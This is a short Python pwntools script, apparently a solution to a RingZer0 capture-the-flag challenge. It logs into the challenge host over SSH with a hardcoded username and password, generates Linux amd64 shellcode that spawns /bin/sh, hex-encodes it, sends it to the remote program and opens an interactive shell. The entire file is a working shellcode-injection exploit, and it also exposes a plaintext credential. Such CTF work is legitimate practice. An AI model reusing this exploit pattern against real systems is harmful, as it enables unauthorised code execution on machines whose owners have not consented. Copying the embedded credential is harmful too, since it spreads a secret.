#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

def escape_encode(s):
    ret = ''
    for c in s:
        ret += '\\x%02x' % ord(c)
    return ret

conn = ssh(user = 'level1', 
           host = 'challenges.ringzer0team.com', 
           password = '50g8O1R0C42nP7N', 
           port = 10127)
shell = conn.shell()

shellcode = asm(shellcraft.sh())
encoded_shellcode = escape_encode(shellcode)

shell.sendline(encoded_shellcode)
shell.interactive()     # you will get shell here
